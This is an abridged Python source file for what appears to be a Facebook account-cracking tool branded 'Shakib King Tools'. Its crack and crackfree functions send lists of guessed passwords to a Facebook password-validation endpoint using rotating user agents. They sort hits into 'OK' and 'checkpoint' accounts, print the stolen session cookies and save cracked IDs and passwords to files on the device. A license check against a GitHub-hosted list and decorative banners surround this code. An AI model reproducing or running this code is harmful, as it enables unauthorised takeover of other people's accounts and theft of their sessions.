...
def main():
    stored_password = "m"  # Replace with your stored password
    ...
    while True:
        ...
        if is_password_valid(user_password, stored_password):
            ...
            print("Welcome to Shakib KING TOOLS!")
            os.system('espeak -a 300 "Welcome to Shakib King Tools varson 2.7 ..."')
            time.sleep(2)
            os.system('clear')
...
princp=[]
try:
    prox= requests.get('https://raw.githubusercontent.com/dxShakib-99/F88/main/approved.txt').text
...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/Shakib.King.Ok.Bro')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
\033[0;92m
 .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| |    _______   | || |  ____  ____  | || |      __      | || |  ___  ____   | || |     _____    | || |   ______     | |
| |   /  ___  |  | || | |_   ||   _| | || |     /  \     | || | |_  ||_  _|  | || |    |_   _|   | || |  |_   _ \    | |
| |  |  (__ \_|  | || |   | |__| |   | || |    / /\ \    | || |   | |_/ /    | || |      | |     | || |    | |_) |   | |
| |   '.___`-.   | || |   |  __  |   | || |   / ____ \   | || |   |  __'.    | || |      | |     | || |    |  __'.   | |
| |  |`\____) |  | || |  _| |  | |_  | || | _/ /    \ \_ | || |  _| |  \ \_  | || |     _| |_    | || |   _| |__) |  | |
| |  |_______.'  | || | |____||____| | || ||____|  |____|| || | |____||____| | || |    |_____|   | || |  |_______/   | |
| |              | || |              | || |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------' 
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
...
╠══[Facebook                 • TEB SHAKIB]    ║  \033[1;97m  
╠══[Github                   • \33[1;38mSHAKIB-KING ]   ║\33[1;34m   
╠══[Whatsapp                 • 01822955863 ]  ║\33[1;35m 
╠══[TOOLS                    • FREE ]         ║ \33[1;32m   
...
def Subscraption():
    ...
    if id in r1:
        ...
        print("\033[1;39m[\033[1;32m●\033[1;39m]\033[1;33m Shakib TooLs Daily Update)✅ \033[0;92m")
...
os.system('espeak -a 300 " Welcome,   to,  Shakib,  King,  Tools"')
pass
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[Shakib•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    #sys.stdout.write(f"\r\033[100;92m{bo}[Shakib•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [OK{bo}•{H}{ok}{P}] [{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;97m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;97m[\033[0;93mShakib-Cp] {idf} \033[0;97m• \033[0;93m{pw}')
                ...
                print(f'\r\033[0;92mShakib-Ok] {idf} \033[0;97m• \033[0;92m{pw}\n\033[0 ;[🌺]= COOKIES • \x1b[38;5;208m{kuki}\033[0;97m\n')
                #cek_apk(session,coki)
                #print(f'\r\033[0;92m[Shakib\033[0;97m•\033[0;92mOk💚] {idf} \033[0;97m• \033[0;92m{pw}\n\033[0;93m[🌺]= COOKIES • \033[100;92m{kuki}\033[0;97m\n')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[Shakib-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;93m[{time.strftime("%H:%M")}\033[0;97m•\033[0;93mShakib-Cp] {idf} \033[0;97m• \033[0;93m{pw}')
                os.system('espeak -a 300 " Cp,"')
                open('/sdcard/Shakib-CP.txt', 'a').write( cid+' | '+ps+' \n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[0;92m[{time.strftime("%H:%M")}\033[0;97m•\033[0;92mShakib-Ok] {idf} \033[0;97m• \033[0;92m{pw} ')
                #cek_apk(session,coki)
                os.system('espeak -a 300 " Shakib,  Ok,  id"')
                open('/sdcard/Shakib-OK.txt', 'a').write( cid+' | '+ps+' \n')
                break
